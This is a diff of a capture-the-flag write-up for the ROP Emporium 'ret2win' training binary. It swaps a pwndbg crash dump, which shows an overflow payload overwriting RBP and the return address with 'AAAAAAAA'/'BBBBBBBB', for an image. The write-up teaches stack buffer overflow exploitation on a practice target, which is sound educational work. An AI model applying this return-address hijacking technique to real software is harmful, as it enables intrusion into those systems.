@@ -96,56 +96,7 @@ io.interactive()
 
 After running above script (`python3 exploit.py GDB`) we can see that program crashed with segmentation fault and `RSP` contains `BBBBBBBB` string as expected, so we're controling that register:
 
-```python
-Program received signal SIGSEGV, Segmentation fault.
-0x0000000000400755 in pwnme ()
-------- tip of the day (disable with set show-tips off) -------
-The set show-flags on setting will display CPU flags register in the regs context panel
-Downloading '/usr/lib/x86_64-linux-gnu/libc.so.6' from the remote server: OK
-add-symbol-file /tmp/tmp_ynsu7vp/libc.so.6 0x7f9ba83cd000 -s .note.gnu.property 0x7f9ba83cd350 -s .note.gnu.build-id 0x7f9ba83cd370 -s .note.ABI-tag 0x7f9ba83cd394 -s .hash 0x7f9ba83cd3b8 -s .gnu.hash 0x7f9ba83d1330 -s .dynsym 0x7f9ba83d5a48 -s .dynstr 0x7f9ba83e7790 -s .gnu.version 0x7f9ba83ef78c -s .gnu.version_d 0x7f9ba83f0f58 -s .gnu.version_r 0x7f9ba83f14c0 -s .rela.dyn 0x7f9ba83f1500 -s .rela.plt 0x7f9ba83f1d28 -s .relr.dyn 0x7f9ba83f2220 -s .plt 0x7f9ba83f3000 -s .plt.got 0x7f9ba83f3360 -s .text 0x7f9ba83f3380 -s __libc_freeres_fn 0x7f9ba8546df0 -s .rodata 0x7f9ba8548000 -s .interp 0x7f9ba856da90 -s .eh_frame_hdr 0x7f9ba856daac -s .eh_frame 0x7f9ba8574eb8 -s .gcc_except_table 0x7f9ba859a540 -s .tdata 0x7f9ba859b8d0 -s .tbss 0x7f9ba859b8e0 -s .init_array 0x7f9ba859b8e0 -s __libc_subfreeres 0x7f9ba859b8f0 -s __libc_atexit 0x7f9ba859b9d8 -s __libc_IO_vtables 0x7f9ba859b9e0 -s .data.rel.ro 0x7f9ba859c760 -s .dynamic 0x7f9ba859eb60 -s .got 0x7f9ba859ed60 -s .got.plt 0x7f9ba859efe8 -s .data 0x7f9ba859f1c0 -s .bss 0x7f9ba85a0880
-LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
-──────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────────
-*RAX  0xb
-*RBX  0x7ffef9f9a078 —▸ 0x7ffef9f9b13d ◂— '/home/kali/ropemporium/ret2win/ret2win'                                                                                                                                                         
-*RCX  0x7f9ba84c5190 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */                                                                                                                                                                             
-*RDX  0x1                                                                                                                                                                                                                                  
-*RDI  0x7f9ba85a1a10 (_IO_stdfile_1_lock) ◂— 0x0                                                                                                                                                                                           
-*RSI  0x1                                                                                                                                                                                                                                  
-*R8   0x4007f0 (__libc_csu_fini) ◂— ret                                                                                                                                                                                                    
-*R9   0x7f9ba85d56a0 (_dl_fini) ◂— push rbp                                                                                                                                                                                                
-*R10  0x7f9ba83dcb40 ◂— 0x10001200001a7e                                                                                                                                                                                                   
-*R11  0x202                                                                                                                                                                                                                                
- R12  0x0                                                                                                                                                                                                                                  
-*R13  0x7ffef9f9a088 —▸ 0x7ffef9f9b164 ◂— 'COLORFGBG=15;0'                                                                                                                                                                                 
- R14  0x0                                                                                                                                                                                                                                  
-*R15  0x7f9ba8603020 (_rtld_global) —▸ 0x7f9ba86042e0 ◂— 0x0                                                                                                                                                                               
-*RBP  0x4141414141414141 ('AAAAAAAA')                                                                                                                                                                                                      
-*RSP  0x7ffef9f99f58 ◂— 'BBBBBBBB\n'                                                                                                                                                                                                       
-*RIP  0x400755 (pwnme+109) ◂— ret                                                                                                                                                                                                          
-───────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────────────
- ► 0x400755 <pwnme+109>    ret    <0x4242424242424242>                                                                                                                                                                                     
-                                                                                                                                                                                                                                           
-
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-00:0000│ rsp 0x7ffef9f99f58 ◂— 'BBBBBBBB\n'
-01:0008│     0x7ffef9f99f60 ◂— 0xa /* '\n' */
-02:0010│     0x7ffef9f99f68 —▸ 0x7f9ba83f418a (__libc_start_call_main+122) ◂— mov edi, eax
-03:0018│     0x7ffef9f99f70 —▸ 0x7ffef9f9a060 —▸ 0x7ffef9f9a068 ◂— 0x38 /* '8' */
-04:0020│     0x7ffef9f99f78 —▸ 0x400697 (main) ◂— push rbp
-05:0028│     0x7ffef9f99f80 ◂— 0x100400040 /* '@' */
-06:0030│     0x7ffef9f99f88 —▸ 0x7ffef9f9a078 —▸ 0x7ffef9f9b13d ◂— '/home/kali/ropemporium/ret2win/ret2win'
-07:0038│     0x7ffef9f99f90 —▸ 0x7ffef9f9a078 —▸ 0x7ffef9f9b13d ◂— '/home/kali/ropemporium/ret2win/ret2win'
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────
- ► f 0         0x400755 pwnme+109
-   f 1 0x4242424242424242
-   f 2              0xa
-   f 3   0x7f9ba83f418a __libc_start_call_main+122
-   f 4   0x7f9ba83f4245 __libc_start_main+133
-   f 5         0x4005da _start+42
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-pwndbg> 
-
-```
+![ret2win ](ret2win-address.jpg)
 
 So, now we need to put a proper address at the end of our payload. We can use gdb `disassemble` get the address of `ret2win()` function:
 
